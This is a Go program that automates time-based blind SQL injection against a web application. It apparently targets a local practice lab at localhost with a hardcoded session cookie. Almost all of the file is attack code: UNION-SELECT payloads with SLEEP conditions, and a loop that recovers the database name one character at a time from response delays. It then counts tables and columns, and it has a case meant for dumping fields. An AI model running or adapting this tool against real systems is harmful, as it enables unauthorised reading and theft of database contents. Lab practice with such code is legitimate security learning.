package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"
)

var Red = "\033[31m"
var Magenta = "\033[35m"
var Green = "\033[32m"
var Yellow = "\033[33m"
var EndColor = "\033[0m"
var verbosePtr *bool
var Strings = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()*+,-./:;<=>?@[]^_`{|}~"

type Database struct {
	TargetValue  string
	DatabaseName string
	TableName    string
	Field        string
}

func makeRequest(payload string) {

	client := &http.Client{}

	encodedPayload := url.QueryEscape(payload)
	url := "http://localhost:8000/sql-injection/error_based/1?search=" + encodedPayload

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		log.Fatal(err)
	}

	req.Header.Add("Cookie", "laravel_session=eyJpdiI6IlZGK3k5YTdnT3JTRlpMRDZJNm9jK0E9PSIsInZhbHVlIjoiMkFRUWJ4U0t4ZXFKSXJmdEZSTm9HS3N3cHBBWGdlS3NxZkcvQUJjSS8zYXVTYnRobWhLTC91cU9Td2RxWjhjZ1AxRzJpSnNvM1laWTdITFZPcm0wK1l0WVR4UVluT3U4MVpBdm02T0VTUWtNZ1VHZmFSaVRSbXRJUEtSMVh0WVUiLCJtYWMiOiI5MWUyODcwZjE3MDFjNjk4ZTI4ODRhZGY1MWVhMDVlMTE1YTUzM2NiNjk1NmZkZTllNzg3N2NiMDRjYzlmNTYxIiwidGFnIjoiIn0%3D")

	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}

	defer resp.Body.Close()

	// body, _ := io.ReadAll(resp.Body)

	// fmt.Println(string(body))
}

func handle() {
	databaseName := exploitDatabase("' or 1=1 union select 1, 2, if(substring((select database()), '{index}', 1)='{value}' , sleep(0.3), NULL), 4, 5, 6; #")
	fmt.Printf("%v\n[✔] Database's name found: %v %v\n", Green, databaseName, EndColor)

	var choice string
	fmt.Print("\nDo you want to continue to exploit tables? [Y/n]: ")
	fmt.Scanf("%v", &choice)

	if strings.ToLower(choice) == "y" {
		database := Database{"tables", databaseName, "", ""}
		tablesNumber := getValueFields(database)
		fmt.Println(tablesNumber)
	} else {
		fmt.Println("Exiting...")
		os.Exit(0)
	}

}

func getValueFields(db Database) int {

	var payload string

	for i := 0; i <= 99; i++ {

		switch db.TargetValue {
		case "tables":
			payload = fmt.Sprintf("' or 1=1 union select 1, 2, if((SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema = '%s')='%d', sleep(0.3), NULL), 4, 5, 6; #'", db.DatabaseName, i)
		case "columns":
			payload = fmt.Sprintf("' or 1=1 union select 1, 2, if((SELECT count(column_name) FROM information_schema.columns WHERE table_schema = '%s' and table_name = '%s')='%d', sleep(0.3), NULL), 4, 5, 6; #'", db.DatabaseName, db.TableName, i)

		case "dump":
			payload = fmt.Sprintf("' or 1=1 union select 1, 2, if((SELECT COUNT(%s) FROM {table_name})='%d' , sleep(0.3), NULL), 4, 5, 6; #'", db.Field, i)
		}

		start := time.Now()
		makeRequest(payload)
		final := time.Now()

		elapsed := final.Sub(start)

		if elapsed >= 300*time.Millisecond {
			return i
		}
	}

	return 0
}

func exploitDatabase(payload string) string {
	item := 1
	name := ""
	total_strings_verified := 0

	for {
		for _, current_value := range Strings {
			payloadFormatted := regexp.MustCompile(`\{index\}`).ReplaceAllString(payload, strconv.Itoa(item))
			payloadFormatted = regexp.MustCompile(`\{value\}`).ReplaceAllString(payloadFormatted, string(current_value))

			start := time.Now()
			makeRequest(payloadFormatted)
			final := time.Now()

			elapsed := final.Sub(start)

			fmt.Printf("%v \rTesting: %v %v", Red, string(current_value), EndColor)

			if *verbosePtr {
				fmt.Printf("Payload: %v %v %v\n", Magenta, string(payloadFormatted), EndColor)
			}

			total_strings_verified++
			if elapsed >= 300*time.Millisecond {
				name = name + string(current_value)
				item++
				total_strings_verified = 0
				break
			}

			if total_strings_verified >= 90 {
				return name
			}
		}
	}
}

func main() {
	verbosePtr = flag.Bool("v", false, "verbose mode")
	flag.Parse()
	handle()
}
